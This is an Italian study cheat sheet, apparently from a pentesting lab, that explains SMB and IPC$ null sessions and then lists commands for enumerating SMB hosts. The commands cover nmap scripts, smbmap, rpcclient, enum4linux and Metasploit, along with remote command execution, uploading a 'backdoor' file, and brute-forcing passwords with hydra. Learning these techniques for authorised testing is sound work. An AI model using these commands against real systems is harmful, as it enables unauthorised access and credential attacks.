Server Message Block è un protocollo client-server che regola l'accesso a file e intere directory e ad altre risorse di rete come stampanti, router o interfacce rilasciate per la rete. 
Lo scambio di informazioni tra diversi processi di sistema può essere gestito anche sulla base del protocollo SMB.  
l protocollo SMB consente al client di comunicare con altri partecipanti alla stessa rete per accedere a file o servizi condivisi con esso sulla rete. Anche l'altro sistema deve aver implementato il protocollo di rete e ricevuto ed elaborato la richiesta del client utilizzando un'applicazione server SMB. Prima però entrambe le parti devono stabilire una connessione, motivo per cui si scambiano prima i messaggi corrispondenti.   
ACL (Accesso Control List) regola i diritti di accesso, attraverso attributi wxr (write, execute, read, full access).

La condivisione IPC$ è nota anche come connessione di sessione nulla. Utilizzando questa sessione, Windows consente agli utenti anonimi di eseguire determinate attività, ad esempio l'enumerazione dei nomi degli account di dominio e delle condivisioni di rete.

La condivisione IPC$ viene creata dal servizio Windows Server. Questa condivisione speciale esiste per consentire le successive connessioni pipe denominate al server. Le pipe denominate del server vengono create dai componenti incorporati del sistema operativo e da qualsiasi applicazione o servizio installato nel sistema. Quando viene creata la pipe denominata, il processo specifica la sicurezza associata alla pipe. Quindi si assicura che l'accesso sia concesso solo agli utenti o ai gruppi specificati.

La proprietà **“browsable”** di una **condivisione SMB** determina se la condivisione è visibile e accessibile quando gli utenti cercano di accedere alle risorse di rete. Quando una condivisione è **“browsable”**, appare nell’elenco delle risorse di rete disponibili per l’utente. Al contrario, se la condivisione non è **“browsable”**, non verrà visualizzata nell’elenco delle risorse di rete.

#### smb nmap scripts
```
After finding SMB through port scanning, gather more information with nmap scripts.
> find /usr/share/nmap/scripts -type f -name *smb* 2>/dev/null


SMB Recon:
> nmap -sV -p 139,445 192.28.157.3

SMB OS detection:
> nmap --script smb-os-discovery -p 445 192.28.157.3

SMB Protocols - version of NTLM supported by samba server:
> nmap -p445 --script smb-protocols 10.2.24.25

SMB Security levels:
> nmap -p445 --script smb-security-mode 10.2.24.25

SMB Enumeration of logged users:
> nmap -p445 --script smb-enum-sessions 10.2.24.25

SMB login admin default
> nmap -p445 --script smb-enum-sessions --script-args smbusername=administrator,smbpassword=smbserver_771 10.2.24.25

SMB All available shares
> nmap -p445 --script smb-enum-shares 10.2.24.25

SMB users
> nmap -p445 --script smb-enum-users 10.2.24.25

SMB windows users
> nmap -p445 --script smb-enum-users --script-args smbusername=administrator,smbpassword=smbserver_771 10.2.24.25

Server statistics
> nmap -p445 --script smb-server-stats --script-args smbusername=administrator,smbpassword=smbserver_771 10.2.24.25

System domains
> nmap -p445 --script smb-enum-domains--script-args smbusername=administrator,smbpassword=smbserver_771 10.2.24.25

Available groups
> nmap -p445 --script smb-enum-groups--script-args smbusername=administrator,smbpassword=smbserver_771 10.2.24.25

Services
> nmap -p445 --script smb-enum-services --script-args smbusername=administrator,smbpassword=smbserver_771 10.2.24.25

ls cmd
> nmap -p445 --script smb-enum-shares,smb-ls --script-args smbusername=administrator,smbpassword=smbserver_771 10.2.24.25 
```

```
# Clear Stored Session
net use * /delete

# Mount the target folder
net use Z:\\10.0.22.92\C$ smbserver_771 /user:administrator

# Find NetBIOS computer name of samba server
nmblookup -A 192.10.10.4

```

#### crackmapexec
```
Enumeration shares SMB with null session:
> crackmapexec smb <FQDN/IP> --shares -u '' -p ''
```
#### smbmap
```
> nmap -p445 --script smb-protocols 10.2.21.233

Login + Permissions of share:
> smbmap -u guest -p "" -d . -H 10.2.21.233
> smbmap -u administrator -p smbserver_771 -d . -H 10.2.21.233

Running Commands:
> smbmap -u administrator -p smbserver_771 -H 10.2.21.233 -x 'ipconfig’

List all drives (Unità del disco, es. C:\ D:\ with "-L")
> smbmap -H 10.2.21.233
> smbmap -u administrator -p 'smbserver_771' -H 10.2.21.233 -L

Discover all shared folders and drives
> smbmap -u "guest" -p "" -d . -H 10.2.21.233

List Directory Contents of specific drive (es: C:\\)
> smbmap -u administrator -p 'smbserver_771' -H 10.2.21.233 -r 'C$’

SMB Shares Using Credentials:
> smbmap -u admin -p password1 -H 192.174.58.3

Upload file:
> smbmap -u administrator -p 'smbserver_771' -H 10.2.21.233 --upload '/root/sample_backdoor' 'C$\sample_backdoor’

Download a file:
> smbmap -u administrator -p 'smbserver_771' -H 10.2.21.233 --download 'C$\flag.txt’ 
```


#### rpcclient
```
SMB null sessions:
> rpcclient -U "" -N 10.10.10.10

SMB server info:
rpcclient $> srvinfo

Enumeration domains users:
rpcclient $> enumdomusers

Enumeration domains groups:
rpcclient $> enumdomgroups

Enumeration domains users using RID:
rpcclient $> queryuser <RIDuser>

Enumeration of all users with RIDuser:
> for i in $(seq 500 1100);do rpcclient -N -U "" 10.129.14.128 -c "queryuser 0x$(printf '%x\n' $i)" | grep "User Name\|user_rid\|group_rid" && echo ""; done

Retrieve domains info, such as server, users:
rpcclient $> querydominfo

Enumeration of all shares available:
rpcclient $> netshareenumall

Enumeration of a specific shares available:
rpcclient $> netsharegetinfo <share>

Enumeration users/admin SID:
rpcclient $> lookupnames admin

```

#### enum4linux
Tools for enumerating data from Windows and Samba hosts

```
Login:
> enum4linux -u "admin" -p "password 192.10.10.10"

OS, target, version of Samba:
> enum4linux -o 192.230.128.3

Users:
> enum4linux -U 192.230.128.3

Shares:
> enum4linux -S 192.187.39.3

Domain Groups:
> enum4linux -G 192.187.39.3

Check if samba server is configured for printing:
> enum4linux -i 192.187.39.3

List all SUID users:
> enum4linux -r -u "admin" -p "password1" 192.174.58.3
```

#### smbclient
FTP-like client to access SMB/CIFS resources on server

```
#List content of directory
> smbclient -L 192.28.157.3 -N
> smbclient -L 192.28.157.3 -U jane

# Open shell in this directory + ls for listing content + get for download
> smbclient //192.187.39.3/public -N
> smbclient //192.174.58.3/jane -U jane
> smbclient //192.174.58.3/admin -U admin

smb> get flag - Important cat and type wont work in smb
```

#### nmblookup
```
NetBIOS over TCP/IP client used to lookup NetBIOS names
> nmblookup -A 192.28.157.3
```


#### metasploit:
```

Pipes: Una caratteristica interessante inclusa nell’SMB è il meccanismo di comunicazione tra processi. Questo meccanismo fornisce le named pipes, attraverso le quali è implementato il meccanismo di autenticazione e l’implementazione Microsoft del DCE/RPC


use auxiliary/scanner/smb/smb_version
use auxiliary/scanner/smb/smb_enumusers
use auxiliary/scanner/smb/smb_enumshares

# SMB - List pipes available over SMB

use auxiliary/scanner/smb/pipe_auditor

# Enum shares
use auxiliary/scanner/smb/smb_enumshares

# Enum all users
use auxiliary/scanner/smb/smb_enumusers

# SMB version of NTLM and SMB2 protocol supported by samba server:
use auxiliary/scanner/smb/smb2

# SMB Bruteforce login:
use auxiliary/scanner/smb/smb_login
set PASS_FILE /usr/share/wordlists/metasploit/unix_passwords.txt
set SMBUser jane
exploit



```

#### hydra
```
hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.174.58.3 smb
```